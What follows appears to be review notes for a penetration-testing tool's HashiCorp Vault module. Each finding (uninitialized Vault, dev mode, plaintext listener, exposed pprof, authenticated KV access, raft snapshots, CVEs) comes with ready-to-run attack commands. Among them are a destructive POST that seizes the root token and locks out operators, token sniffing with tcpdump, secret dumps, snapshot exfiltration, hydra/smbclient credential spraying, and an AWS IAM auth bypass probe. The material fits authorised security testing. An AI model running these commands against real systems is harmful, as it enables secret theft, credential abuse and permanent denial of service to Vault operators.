summary: Vault module has real depth: unauth surface findings (uninitialized, dev-mode, plaintext listener, pprof/metrics) are true T1s; authed walk (mounts, auth backends, KV read, raft snapshot HEAD) reaches T2/T3 when a token is supplied — it actually reads plaintext KV secrets and folds them into known_credentials/users/hostnames. Uninitialized is currently T1 (safe check only) but a T2 probe POST would seize the root token — the biggest promotion available. Raft snapshot is HEAD-only (safe); an actual snapshot download would be T3 initial access (attacker-decryptable BoltDB). CVE detection is version-gated with a small verified whitelist.

findings.tester_next_step: curl -sk https://<ip>:8200/v1/sys/seal-status; note version → check HCSEC bulletins.

findings.tier_evidence: GET /v1/sys/init returned initialized=false — safe read, no POST attempted.
findings.promotion_notes: T3 = POST /v1/sys/init with {secret_shares:1,secret_threshold:1} to seize the root token + unseal share. First-writer-wins so this permanently locks the operator out. Must be gated behind --exploit --destructive.
findings.tester_next_step: # DESTRUCTIVE: curl -sk -X POST -d '{"secret_shares":1,"secret_threshold":1}' https://<ip>:8200/v1/sys/init → capture root_token + unseal_keys_b64[0]; then vault unseal + VAULT_TOKEN=<root> vault kv list.

findings.title_pattern: Vault running in dev mode (root token 'root', in-memory storage)
findings.tier_evidence: sealed=false + storage_type='inmem' signature of `vault server -dev` — inference, not a login attempt.
findings.promotion_notes: T3 = actually POST X-Vault-Token: root against /v1/sys/mounts; a 200 confirms full compromise and can drive the full authed walk automatically. Non-destructive.
findings.tester_next_step: curl -sk -H 'X-Vault-Token: root' https://<ip>:8200/v1/sys/mounts; if 200, VAULT_ADDR=https://<ip>:8200 VAULT_TOKEN=root vault kv list secret/ and dump everything.

findings.tier_evidence: Detected via http_and_tls dual-listener test + used_tls=False path — deterministic.
findings.promotion_notes: T3 = passive on-path capture of X-Vault-Token headers via tcpdump/bettercap on the segment; each captured token replays for whatever ACL it holds. Requires L2 access to the segment.
findings.tester_next_step: tcpdump -i any -A -s0 'tcp port 8200 and host <ip>' | grep -iE 'X-Vault-Token|s\.[A-Za-z0-9]{24,}' — grab any client token then curl https://<ip>:8200/v1/sys/mounts -H 'X-Vault-Token: <captured>'.

findings.title_pattern: Vault debug / metrics endpoints reachable unauthenticated
findings.tier_evidence: pprof/goroutine body length > 100 + metrics body contains 'vault'.
findings.promotion_notes: T2 = pull full goroutine/heap dump and grep for in-memory secret material (unseal shards, token fragments). Known Vault issue class.
findings.tester_next_step: curl -sk 'https://<ip>:8200/v1/sys/pprof/goroutine?debug=2' -o goroutine.txt; grep -aiE 'unseal|token|secret|password|s\.[A-Za-z0-9]{24,}' goroutine.txt; also fetch /v1/sys/pprof/heap.

findings.title_pattern: Vault authenticated - mounts and auth backends enumerated
findings.tier_evidence: Supplied token actually authorised — /v1/sys/mounts returned 200 → real proof of foothold on the token's scope.
findings.promotion_notes: T3 already reached by companion vault_authed_secret_read + vault_raft_snapshot_dump. Enrich by also fetching /v1/sys/policies and /v1/auth/*/users to know what else the token unlocks.
findings.tester_next_step: VAULT_ADDR=https://<ip>:8200 VAULT_TOKEN=<t> vault token lookup; vault policy list; vault auth list; then vault kv list on each kv mount.

findings.title_pattern: Vault KV secret dump succeeded - plaintext secrets returned
findings.tier_evidence: Actual KV data returned + folded into known_credentials/users — this is initial access, plaintext secret material captured.
findings.promotion_notes: T4 = replay captured KV creds automatically against SSH/SMB/MSSQL/PostgreSQL/database services via the credential-store spray loop. Wiring exists (facts.credentials) but downstream sprayers may not yet consume vault-kv:* source.
findings.tester_next_step: For each captured vault-kv credential: hydra -L <users> -P <pw> ssh://<ip>; smbclient -L -U user%pass //<ip>; test each disclosed URL/hostname for reuse.

findings.title_pattern: Vault raft snapshot reachable - full storage dump available
findings.tier_evidence: HEAD returned 200/204 + content-length — proof root/sudo capability exists, but the actual snapshot isn't downloaded (would be many GB).
findings.promotion_notes: T3 = GET the full snapshot (potentially huge); offline it's a gzipped BoltDB with all Vault storage — every KV secret, policy, auth config. Decryptable if the master key can be recovered from the same host.
findings.tester_next_step: curl -sk -H 'X-Vault-Token: <root>' https://<ip>:8200/v1/sys/storage/raft/snapshot -o vault.snap; then vault operator raft snapshot inspect vault.snap; strings vault.snap | grep -iE 'password|token|secret'.

findings.tier_evidence: Version-string range match against HCSEC bulletin whitelist — no live exploit sent.
findings.promotion_notes: Per-CVE PoC (e.g. CVE-2020-16250 AWS IAM signature bypass) would need a crafted login attempt; risky and CVE-specific.
findings.tester_next_step: For CVE-2020-16250/16251: attempt vault write auth/aws/login role=<r> iam_http_request_method=POST ...  with a spoofed X-Vault-AWS-IAM-Server-ID header — see HCSEC-2020-18 PoC.
